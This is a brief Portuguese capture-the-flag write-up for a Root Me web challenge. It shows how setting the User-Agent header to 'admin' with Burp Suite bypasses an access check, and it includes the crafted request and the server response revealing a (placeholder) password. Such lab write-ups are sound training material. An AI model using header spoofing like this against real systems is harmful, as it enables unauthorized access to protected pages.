# HTTP - User-agent

Efetuando a troca do user-agent no cabeçalho HTTP, é possível fazer o bypass através da requisição e obter a senha.
A captura e edição da requisição pode ser feita pelo Burp Suit.

## Requisição:

<pre>GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: admin
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0</pre>

## Resposta:

<pre>HTTP/1.1 200 OK
Server: nginx
Date: Sun, 02 Feb 2020 21:12:47 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Content-Length: 268

<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: (password_here)</h3></body></html></pre>
